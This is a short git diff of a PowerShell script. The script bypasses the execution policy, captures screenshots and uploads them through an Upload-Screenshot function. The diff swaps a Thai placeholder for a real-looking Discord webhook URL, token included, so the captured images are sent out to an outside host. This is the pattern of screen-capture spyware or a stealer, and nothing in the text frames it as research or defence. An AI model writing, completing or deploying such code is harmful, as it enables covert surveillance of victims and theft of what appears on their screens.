@@ -1,4 +1,4 @@
-# Ensure execution policy allows running scripts
+    # Ensure execution policy allows running scripts
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
 # Function to capture screenshot
@@ -36,7 +36,7 @@ function Upload-Screenshot {
         [string]$filePath
     )
 
-    $webhookUrl = 'webhook ของตัวเอง'
+    $webhookUrl = 'https://discord.com/api/webhooks/1299618917244735538/DPXPaVf9DRhQjb5zxePRl4OVFxrgD7h6zduPPzJD42tGRiaDYyKMA1v7gow9X3wSaMTZ'
 
     # Prepare the file data for upload
     $fileData = @{
